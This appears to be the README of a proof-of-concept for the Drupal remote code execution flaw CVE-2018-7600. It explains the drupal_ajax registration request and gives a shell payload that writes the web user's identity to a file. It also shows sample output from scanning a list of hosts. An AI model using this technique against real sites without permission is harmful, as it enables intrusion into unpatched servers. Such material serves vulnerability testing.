# Proof-Of-Concept for [CVE-2018-7600 / SA-CORE-2018-002](https://cve.circl.lu/cve/CVE-2018-7600) [![codebeat badge](https://codebeat.co/badges/7e8e7a0a-07df-4fd7-852c-8bb6dc60b8e5)](https://codebeat.co/projects/github-com-thehappydinoa-cve-2018-7600-main)


Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations.

## How it works

1.  It sends a packet to the `drupal_ajax` wrapper to register a user. Allows user to use the `exec` markup and run bash. This PoC sends a the user name and id to abcde.txt.

    ```bash
    echo Name: $(id -un) UID: $(id -u) Groups: $(id -Gn) | tee abcde.txt
    ```

2.  Checks `http*://example.com/abcde.txt`

    ```bash

    [?] Enter file name (example: /root/file/hosts.txt): hosts.txt
    [+] https://example.com/ Possibly exploitable
    [~] Checking... https://example.com/abcde.text
    [+] https://example.com/ Exploitable
    [+] UID: 33 Name: www-data
    [+] Deleting... https://example.com/abcde.text
    ```

## Payloads

%s = file name

User ID, PID, and Group Payload

```bash
echo Name: $(id -un) UID: $(id -u) Groups: $(id -Gn) | tee %s
```
